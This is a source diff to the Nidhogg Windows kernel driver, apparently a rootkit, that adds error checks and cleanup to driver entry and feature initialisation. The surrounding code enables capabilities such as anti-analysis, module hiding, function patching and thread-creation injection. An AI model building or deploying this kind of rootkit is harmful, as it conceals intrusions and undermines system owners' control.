@@ -43,10 +43,11 @@ NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath) 
 NTSTATUS NidhoggEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath) {
 	UNREFERENCED_PARAMETER(RegistryPath);
 	NTSTATUS status = STATUS_SUCCESS;
-	InitializeFeatures();
 
-	if (WindowsBuildNumber < WIN_1507)
+	if (!InitializeFeatures()) {
+		ClearAll();
 		return STATUS_INCOMPATIBLE_DRIVER_BLOCKED;
+	}
 
 	// Setting up the device object.
 	UNICODE_STRING deviceName = RTL_CONSTANT_STRING(DRIVER_DEVICE_NAME);
@@ -60,6 +61,7 @@ NTSTATUS NidhoggEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath)
 
 	if (!NT_SUCCESS(status)) {
 		KdPrint((DRIVER_PREFIX "Failed to create device: (0x%08X)\n", status));
+		ClearAll();
 		return status;
 	}
 
@@ -68,6 +70,7 @@ NTSTATUS NidhoggEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath)
 	if (!NT_SUCCESS(status)) {
 		KdPrint((DRIVER_PREFIX "Failed to create symbolic link: (0x%08X)\n", status));
 		IoDeleteDevice(DeviceObject);
+		ClearAll();
 		return status;
 	}
 
@@ -204,24 +207,44 @@ void ClearAll() {
 * Returns:
 * There is no return value.
 */
-void InitializeFeatures() {
-
+bool InitializeFeatures() {
 	// Initialize utils.
 	NidhoggProccessUtils = new ProcessUtils();
+
+	if (!NidhoggProccessUtils)
+		return false;
+
 	NidhoggFileUtils = new FileUtils();
+
+	if (!NidhoggFileUtils)
+		return false;
+
 	NidhoggMemoryUtils = new MemoryUtils();
+
+	if (!NidhoggMemoryUtils)
+		return false;
+
 	NidhoggAntiAnalysis = new AntiAnalysis();
+
+	if (!NidhoggAntiAnalysis)
+		return false;
+
 	NidhoggRegistryUtils = new RegistryUtils();
+
+	if (!NidhoggRegistryUtils)
+		return false;
 
 	// Get windows version.
 	RTL_OSVERSIONINFOW osVersion = { sizeof(osVersion) };
 	NTSTATUS result = RtlGetVersion(&osVersion);
 
-	if (NT_SUCCESS(result))
-		WindowsBuildNumber = osVersion.dwBuildNumber;
+	if (!NT_SUCCESS(result))
+		return false;
+
+	WindowsBuildNumber = osVersion.dwBuildNumber;
 
 	if (WindowsBuildNumber < WIN_1507)
-		return;
+		return false;
 
 	// Initialize functions.
 	if (!(PULONG)MmCopyVirtualMemory)
@@ -233,7 +256,7 @@ void InitializeFeatures() {
 	if (!Features.WriteData || !(PULONG)PsGetProcessPeb)
 		Features.FunctionPatching = false;
 
-	if (!(PULONG)PsGetProcessPeb || !(PULONG)PsLoadedModuleList)
+	if (!(PULONG)PsGetProcessPeb || !(PULONG)PsLoadedModuleList || !&PsLoadedModuleResource)
 		Features.ModuleHiding = false;
 
 	if (!(PULONG)ObReferenceObjectByName)
@@ -247,4 +270,5 @@ void InitializeFeatures() {
 
 	if (NidhoggMemoryUtils->FoundNtCreateThreadEx())
 		Features.CreateThreadInjection = true;
+	return true;
 }
